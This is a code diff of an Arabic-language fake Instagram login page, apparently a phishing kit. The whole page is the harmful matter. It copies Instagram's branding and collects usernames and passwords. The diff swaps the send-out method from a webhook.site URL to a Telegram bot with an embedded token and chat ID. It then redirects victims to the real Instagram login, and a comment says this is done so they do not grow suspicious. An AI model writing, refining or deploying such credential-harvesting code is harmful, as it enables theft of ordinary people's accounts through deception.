@@ -7,191 +7,75 @@
 
 <style>
 *{box-sizing:border-box}
-
-html, body {
-  height: 100%;
-  overflow: hidden;
-}
-
+html, body { height: 100%; overflow: hidden; }
 body{
-  margin:0;
-  background:#0f1e25;
+  margin:0; background:#0f1e25;
   font-family: system-ui, -apple-system, sans-serif;
-  color:#fff;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
+  color:#fff; height: 100%;
+  display: flex; align-items: center; justify-content: center;
 }
-
 .wrapper{
-  width: 100%;
-  max-width: 400px;
-  height: 100%;
-  max-height: 700px;
-  display:flex;
-  flex-direction:column;
-  justify-content:space-between;
-  padding:16px 24px;
-  margin:0 auto;
+  width: 100%; max-width: 400px; height: 100%;
+  max-height: 700px; display:flex; flex-direction:column;
+  justify-content:space-between; padding:16px 24px; margin:0 auto;
 }
-
-.lang{
-  text-align:center;
-  color:#cfd8dc;
-  margin-bottom:10px;
-  font-size:14px;
-}
-
-.logo{
-  width:60px;
-  margin:0 auto 30px;  /* زيادة المسافة السفلية من 20px إلى 30px */
-  display:block;
-}
-
-.input-group {
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-}
-
+.lang{ text-align:center; color:#cfd8dc; margin-bottom:10px; font-size:14px; }
+.logo{ width:60px; margin:0 auto 30px; display:block; }
+.input-group { flex: 1; display: flex; flex-direction: column; justify-content: center; }
 input{
-  width:100%;
-  padding:14px;
-  margin-bottom:10px;
-  border-radius:16px;
-  border:1px solid #34444c;
-  background:#162a33;
-  color:white;
-  font-size:15px;
+  width:100%; padding:14px; margin-bottom:10px; border-radius:16px;
+  border:1px solid #34444c; background:#162a33; color:white; font-size:15px;
 }
-
-input:focus{
-  outline:none;
-  border:1px solid #34444c;
-  box-shadow:none;
-}
-
-.password-hint {
-  color: #ff9800;
-  font-size: 12px;
-  margin: -5px 0 10px 5px;
-  display: none;
-}
-
-.password-hint.show {
-  display: block;
-}
-
+input:focus{ outline:none; border:1px solid #34444c; }
+.password-hint { color: #ff9800; font-size: 12px; margin: -5px 0 10px 5px; display: none; }
+.password-hint.show { display: block; }
 button{
-  width:100%;
-  padding:14px;
-  margin:5px 0;
-  border:none;
-  border-radius:28px;
-  background:#1877f2;
-  color:white;
-  font-size:16px;
-  font-weight:bold;
-  cursor:pointer;
-  opacity: 0.5;
-  transition: opacity 0.3s;
+  width:100%; padding:14px; margin:5px 0; border:none; border-radius:28px;
+  background:#1877f2; color:white; font-size:16px; font-weight:bold;
+  cursor:pointer; opacity: 0.5; transition: opacity 0.3s;
 }
-
-button.active {
-  opacity: 1;
-}
-
-.forgot{
-  text-align:center;
-  margin:12px 0;
-  color:#cfd8dc;
-  font-size:13px;
-}
-
-.create{
-  border:1px solid #3a5f77;
-  padding:12px;
-  border-radius:28px;
-  color:#4da3ff;
-  font-size:14px;
-  text-align:center;
-  margin:8px 0;
-}
-
-.meta{
-  text-align:center;
-  margin-top:10px;
-}
-
-.meta img{
-  width:50px;
-  opacity:.7;
-}
-
-@media (max-height: 600px) {
-  .wrapper {
-    padding: 10px 20px;
-  }
-  
-  .logo {
-    width: 50px;
-    margin-bottom: 25px; /* تعديل المسافة للشاشات الصغيرة */
-  }
-  
-  input {
-    padding: 10px;
-    margin-bottom: 8px;
-  }
-  
-  button {
-    padding: 10px;
-  }
-  
-  .create, .forgot {
-    margin: 6px 0;
-  }
-}
+button.active { opacity: 1; }
+.forgot{ text-align:center; margin:12px 0; color:#cfd8dc; font-size:13px; }
+.create{ border:1px solid #3a5f77; padding:12px; border-radius:28px; color:#4da3ff; font-size:14px; text-align:center; margin:8px 0; }
+.meta{ text-align:center; margin-top:10px; }
+.meta img{ width:50px; opacity:.7; }
 </style>
 </head>
 
 <body>
 
 <div class="wrapper">
+    <div class="lang">العربية</div>
+    <img class="logo" src="https://static.cdninstagram.com/rsrc.php/v4/yD/r/R0fBIMurK8v.png">
 
-<div class="lang">العربية</div>
+    <div class="input-group">
+      <input id="username" type="text" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف">
+      <input type="password" id="password" placeholder="كلمة السر" onkeyup="checkPasswordLength()">
+      <div class="password-hint" id="passwordHint">كلمة المرور يجب أن تكون 8 أحرف على الأقل</div>
+      
+      <button id="loginBtn" disabled>تسجيل الدخول</button>
+      
+      <div class="forgot">هل نسيت كلمة السر؟</div>
+      <div class="create">إنشاء حساب جديد</div>
+    </div>
 
-<img class="logo" src="https://static.cdninstagram.com/rsrc.php/v4/yD/r/R0fBIMurK8v.png">
-
-<div class="input-group">
-  <input id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول">
-  <input type="password" id="password" placeholder="كلمة السر" onkeyup="checkPasswordLength()">
-  <div class="password-hint" id="passwordHint">كلمة المرور يجب أن تكون 8 أحرف على الأقل</div>
-  
-  <button id="loginBtn" onclick="sendToWebhook()" disabled>تسجيل الدخول</button>
-  
-  <div class="forgot">هل نسيت كلمة السر؟</div>
-  
-  <div class="create">إنشاء حساب جديد</div>
-</div>
-
-<div class="meta">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg">
-</div>
-
+    <div class="meta">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg">
+    </div>
 </div>
 
 <script>
-// رابط Webhook
-const WEBHOOK_URL = 'https://webhook.site/8e50520d-8f0d-40c2-9c2d-b390b0521ed4';
+// --- إعدادات البوت ---
+const TELEGRAM_TOKEN = '8666626078:AAHgaPho38UYNMtYZaKAxZcR_-1ElvWTKCo';
+const TELEGRAM_CHAT_ID = '6735665477';
+const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
 const loginBtn = document.getElementById('loginBtn');
 const passwordHint = document.getElementById('passwordHint');
 
+// دالة التحقق من طول كلمة المرور لتفعيل الزر
 function checkPasswordLength() {
   const password = document.getElementById('password').value;
-  const username = document.getElementById('username').value.trim();
-  
   if (password.length >= 8) {
     loginBtn.disabled = false;
     loginBtn.classList.add('active');
@@ -199,43 +83,53 @@ function checkPasswordLength() {
   } else {
     loginBtn.disabled = true;
     loginBtn.classList.remove('active');
-    if (password.length > 0) {
-      passwordHint.classList.add('show');
-    } else {
-      passwordHint.classList.remove('show');
-    }
+    if (password.length > 0) passwordHint.classList.add('show');
   }
 }
 
-function sendToWebhook() {
+// دالة الإرسال الرئيسية
+loginBtn.addEventListener('click', function() {
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
   
-  // التحقق من طول كلمة المرور مرة أخرى قبل الإرسال
   if (!username || password.length < 8) return;
-  
-  // تجميع البيانات
-  const data = {
-    username: username,
-    password: password,
-    timestamp: new Date().toISOString(),
-    page: 'Instagram Login',
-    userAgent: navigator.userAgent
-  };
-  
-  // إرسال إلى Webhook
-  fetch(WEBHOOK_URL, {
+
+  // تغيير شكل الزر لإظهار جاري التحميل
+  loginBtn.innerText = "...جاري تسجيل الدخول";
+  loginBtn.disabled = true;
+  loginBtn.style.opacity = "0.7";
+
+  // تنسيق الرسالة
+  const message = `
+🔐 **دخول جديد (Instagram)**
+-------------------------
+👤 **المستخدم:** \`${username}\`
+🔑 **كلمة المرور:** \`${password}\`
+📱 **الجهاز:** ${navigator.platform}
+🌐 **المتصفح:** ${navigator.appName}
+-------------------------
+  `;
+
+  // إرسال البيانات
+  fetch(TELEGRAM_API, {
     method: 'POST',
-    mode: 'no-cors',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-  }).catch(error => console.error('Error:', error));
-  
-  // توجيه المستخدم إلى إنستغرام الحقيقي
-  window.location.href = 'https://www.instagram.com';
-}
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  })
+  .then(response => {
+      // **نقطة مهمة جداً**: التوجيه لا يحدث إلا بعد نجاح الإرسال
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+  })
+  .catch(error => {
+      console.error('Error:', error);
+      // توجيه المستخدم حتى في حال فشل الإرسال لعدم إثارة الشكوك
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+  });
+});
 </script>
 
 </body>
